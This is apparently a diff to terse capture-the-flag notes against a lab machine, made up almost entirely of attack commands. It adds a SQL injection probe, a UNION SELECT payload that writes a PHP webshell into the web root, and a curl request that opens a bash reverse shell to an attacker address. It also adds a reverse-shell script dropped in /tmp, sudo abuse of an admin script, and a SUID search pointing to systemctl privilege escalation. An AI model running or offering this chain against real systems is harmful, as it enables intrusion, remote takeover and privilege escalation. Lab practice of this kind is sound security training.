@@ -1,10 +1,16 @@
 ```
 SQL injection
+http://10.10.10.143/room.php?cod=2 and 1=1
 Webshell
+http://10.10.10.143/room.php?cod=-2 UNION SELECT 1,'<?php system($_REQUEST["exec"]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'
+curl -X POST http://10.10.10.143/pwned.php --data-urlencode 'exec=bash -c "bash -i >& /dev/tcp/10.10.14.3/1234 0>&1"'
 sudo -l
 Reverse Shell - Bash
+echo 'bash -c "bash -i >& /dev/tcp/10.10.14.3/4444 0>&1"' > /tmp/shell.sh
+sudo -u pepper /var/www/Admin-Utilities/simpler.py –p
+find / -perm -4000 2>/dev/null
 LinEnum
-PrivEsc - systemctl
+PrivEsc - SUID systemctl
 ```
 
 ```
